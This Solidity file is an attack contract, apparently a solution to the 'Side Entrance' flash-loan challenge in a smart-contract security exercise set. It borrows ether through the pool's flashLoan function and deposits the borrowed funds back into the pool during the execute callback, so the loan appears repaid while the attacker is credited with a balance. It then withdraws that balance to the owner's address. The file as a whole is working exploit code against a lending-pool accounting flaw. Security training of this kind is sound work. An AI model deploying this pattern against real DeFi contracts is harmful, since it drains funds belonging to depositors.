// SPDX-License-Identifier: MIT

import "./SideEntranceLenderPool.sol";
import "hardhat/console.sol";

contract AttackSideEntrance {

    SideEntranceLenderPool public immutable sideEntranceLenderPool;
    address public immutable owner;

    constructor (address _poolAddr, address _owner) {
        owner = _owner;
        sideEntranceLenderPool = SideEntranceLenderPool(_poolAddr);
    }

    function Loaner(uint256 amount) public payable {
        require(msg.sender == owner, "Not the owner!");
        sideEntranceLenderPool.flashLoan(amount);
    }

    function execute() external payable {
        require(tx.origin == owner, "Originator issue!");
        require(msg.sender == address(sideEntranceLenderPool), "Sender must be pool");

        console.log("msg.value is = " , msg.value);
        console.log("pool balance is = " , address(sideEntranceLenderPool).balance);

        // sideEntranceLenderPool.deposit{value: msg.value}();   // REKT :D
        (bool success, ) = address(sideEntranceLenderPool).call{value:msg.value}(
            abi.encodeWithSignature("deposit()")
        );
        require(success == true, "no rekt");
    }

    function withdrawFromPool() public {
        require(msg.sender == owner, "Not the owner!");
        sideEntranceLenderPool.withdraw();
        (bool sent, ) = owner.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    //Receives ether
    receive() external payable {}
}